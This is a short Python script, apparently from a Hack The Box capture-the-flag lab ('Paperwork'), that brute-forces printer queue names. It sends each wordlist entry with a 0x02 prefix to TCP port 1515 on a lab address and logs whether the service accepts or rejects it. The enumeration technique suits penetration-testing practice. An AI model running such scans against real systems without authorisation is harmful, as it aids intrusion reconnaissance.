#!/usr/bin/env python3
# As used in HTB - Paperwork machine 

import socket

HOST = "10.129.248.117"
PORT = 1515
WORDLIST = "wordlist.txt"

with open(WORDLIST, "r") as f:
    for line in f:
        queue = line.strip()

        if not queue:
            continue

        payload = b"\x02" + queue.encode()

        try:
            with socket.create_connection((HOST, PORT), timeout=3) as s:
                s.sendall(payload)

                try:
                    response = s.recv(1)
                except socket.timeout:
                    response = b""

                if response == b"\x00":
                    print(f"[+] ACCEPTED : {queue}")
                elif response == b"\x01":
                    print(f"[-] REJECTED : {queue}")
                elif response:
                    print(f"[?] {queue:<25} Response: {response.hex()}")
                else:
                    print(f"[ ] {queue:<25} No response")

        except Exception as e:
            print(f"[!] {queue:<25} Error: {e}")